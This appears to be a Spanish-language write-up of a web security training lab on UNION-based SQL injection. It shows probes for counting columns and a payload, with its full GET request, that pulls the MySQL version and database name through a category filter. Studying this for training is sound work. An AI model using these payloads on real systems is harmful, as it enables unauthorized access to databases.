# 04 Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

Objetivo

```bash
This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.
```

## Solución

> Podemos usar `'+UNION+SELECT+'abc','def'#` para añadir texto directamente al utilizar consultas UNION
> 

Debemos verificar cuantas columnas nos va a devolver nuestra query, podemos utilizar `UNION SELECT ‘TEXT1’, ‘TEXT2, ‘TEXT3'#`  sI vemos que nos muestra error 500, significa que la consulta original no tiene esa cantidad de columnas

![image.png](04%20Lab%20SQL%20injection%20attack,%20querying%20the%20database%2012cfab5460ec80949f6afcfdc6edf585/image.png)

Utilizamos el siguiente payload para que nos muestre la versión de la BD y el nombre de la BD

```jsx
Payload: '+UNION+SELECT+@@version,DATABASE()#
GET /filter?category=Lifestyle'+UNION+SELECT+@@version,DATABASE()#
```

![image.png](04%20Lab%20SQL%20injection%20attack,%20querying%20the%20database%2012cfab5460ec80949f6afcfdc6edf585/image%201.png)

![image.png](04%20Lab%20SQL%20injection%20attack,%20querying%20the%20database%2012cfab5460ec80949f6afcfdc6edf585/image%202.png)

![image.png](04%20Lab%20SQL%20injection%20attack,%20querying%20the%20database%2012cfab5460ec80949f6afcfdc6edf585/image%203.png)